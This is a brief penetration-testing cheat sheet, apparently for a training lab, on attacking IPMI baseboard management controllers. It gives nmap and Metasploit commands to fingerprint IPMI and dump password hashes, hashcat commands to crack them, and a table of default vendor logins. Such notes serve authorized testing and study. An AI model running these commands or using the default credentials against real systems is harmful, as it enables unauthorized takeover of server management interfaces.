---
title: "Intelligent Platform Management Interface"
date: 2025-08-23
tags: [ipmi, service]
port: [udp, 623]
---

# Intelligent Platform Management Interface

## Enumeration

*Common Commands*

`$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local`

### Msfconsole Version Scan | Hash Dum

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 

# Hash dump
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
```

### Crack the hashes with hascat

```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

# With other wordlist
hashcat -m 7300 /tmp/1 /usr/share/wordlists/rockyou.txt
```

### Common or default logins

| Product | Username | Password |
| --- |  --- |  --- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomised 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN | ADMIN |

### Service Information

- [Pentesting IPMI](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)

